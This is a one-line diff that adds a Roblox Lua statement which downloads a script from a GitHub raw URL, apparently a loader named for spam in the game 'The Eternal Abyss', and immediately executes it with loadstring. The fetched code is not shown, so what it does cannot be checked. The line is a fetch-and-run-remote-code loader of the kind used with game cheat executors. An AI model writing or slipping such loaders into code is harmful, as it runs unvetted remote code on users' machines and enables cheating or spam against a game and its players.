@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/the-eternal-abyss-spam2-9w9k9fzugdfinu.lua"))()
